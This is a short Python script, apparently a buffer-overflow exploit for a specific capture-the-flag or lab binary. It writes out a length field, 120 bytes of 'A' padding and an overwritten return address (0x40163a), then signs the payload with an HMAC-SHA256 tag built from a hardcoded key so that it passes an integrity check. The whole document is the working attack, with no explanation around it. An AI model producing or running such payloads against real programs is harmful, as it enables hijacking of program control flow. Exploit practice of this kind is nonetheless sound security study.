#!/usr/bin/env python3

import sys
import hmac
import hashlib
size = int(128).to_bytes(8, 'little')
msg = b'A'*120 + 0x000000000040163a.to_bytes(8, 'little')
ad1 = 0x7f07c76d48fe084a
ad2 = 0x70c89b82e7d0aa5c
ad3 = 0x401e168e85b784ad
ad4 = 0x1188030141faf7ba
key = ad1.to_bytes(8, 'little') + ad2.to_bytes(8, 'little') + ad3.to_bytes(8, 'little') + ad4.to_bytes(8, 'little')
h = hmac.new(key, msg, hashlib.sha256).digest()

sys.stdout.buffer.write(size + msg + h)
